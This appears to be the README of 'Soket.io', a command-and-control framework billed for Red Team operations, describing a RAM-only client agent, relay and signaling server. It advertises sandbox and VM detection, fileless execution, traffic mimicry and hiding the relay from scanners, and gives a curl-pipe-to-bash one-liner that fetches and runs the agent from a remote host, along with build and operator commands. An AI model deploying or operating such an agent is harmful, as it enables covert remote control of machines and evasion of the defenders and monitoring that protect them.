# SOKET.IO v1.0 | Unified Socket Infrastructure

[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-BearSSL-cyan.svg)](https://bearssl.org/)
[![Arch](https://img.shields.io/badge/Arch-Multi--Arch-green.svg)](#supported-architectures)
[![Status](https://img.shields.io/badge/Status-v1.0-red.svg)](#deployment)

**Soket.io v1.0** is a C2 infrastructure engineered for supreme stealth, absolute resilience, and kernel-level interaction. Standardized for production deployment, it provides a hardened communication layer for advanced Red Team operations.

---

## 🏗️ Technical Architecture

| Component | Responsibility | Technology Stack |
| :--- | :--- | :--- |
| **Client Agent** | Stealth execution & Monitoring | C99, BearSSL, Monocypher, Inotify |
| **Relay Multiplexer** | Session management & Routing | Go 1.22, TLS Mimicry, Ed25519 |
| **Signaling Server** | Discovery & Hole-punching | Go 1.22, WebSockets, DGA, Tor |

### 🛰️ Infrastructure Flow
```text
[Operator Console] <---> [Relay Multiplexer (PSK + TLS 1.3)] <---> [Client Agent (RAM-Only)]
                                     ^
                                     |
                          [Signaling & Discovery]
```

---

## 🛡️ Security & Evasion Features

| Feature | Technical Implementation | Purpose |
| :--- | :--- | :--- |
| **Anti-VM** | CPUID & Artifact Scanning | Prevents execution in Sandboxes/VMs |
| **Fileless Execution** | `memfd_create` | Resides entirely in RAM (No disk trace) |
| **L7 Mimicry** | TLS Fingerprinting | Mimics Chrome/Firefox HTTPS traffic |
| **Jittered Heartbeat** | Randomized intervals | Defeats traffic pattern analysis |
| **Pre-Auth PSK** | TCP-level verification | Hides Relay from Shodan/Nmap scans |
| **Interactive PTY** | `forkpty` integration | Seamless sudo/nano/terminal support |

---

## 🚀 Deployment Guide

### 1. Unified One-Liner (Standard)
The fastest way to deploy the agent in memory:
```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh)"
```

### 2. Manual Build (Production)
```bash
# Build Client Agent
cd client && make clean && make prod

# Build Relay Server
cd relay && CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/phantom-relay cmd/relay/main.go
```

### 3. Verification
Run the automated auditor to ensure 100% static linkage:
```bash
bash verify_build.sh
```

---

## 📂 Operational Commands

Standardized aliases for quick access:
- **`gs-oyen-s`**: The unified agent binary.
- **`gs-oyen-r`**: The high-performance relay multiplexer.

### Example:
```bash
# Start Relay with custom listener
gs-oyen-r -listen 0.0.0.0:443

# Execute Agent with PSK
gs-oyen-s -s "SECRET_KEY" -i "RELAY_IP" -m 443
```

---

## ❓ FAQ & Troubleshooting

- **GLIBC Error?**: Use the provided static builds. Our binaries are linked with `musl-libc` to ensure zero dependencies on host libraries.
- **404/Connection Refused?**: Verify the PSK (Pre-Shared Key). The relay will drop any connection that does not provide the correct 4-byte PSK before the TLS handshake.
- **PTY Session Hangs?**: Ensure your terminal supports `xterm-256color` for full interactive compatibility.

---

&copy; 2026 Oyen-Sec Infrastructure. Engineered for absolute resilience.
